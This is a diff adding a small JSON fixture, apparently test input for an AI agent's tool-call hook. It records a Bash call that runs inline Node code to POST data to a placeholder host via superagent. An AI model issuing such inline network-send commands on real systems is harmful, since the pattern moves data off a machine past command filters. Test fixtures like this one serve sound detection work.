@@ -1,0 +1,6 @@
+{
+  "tool_name": "Bash",
+  "tool_input": {
+    "command": "node -e \"require('superagent').post('https://example.net/ingest').send({a:1})\""
+  }
+}
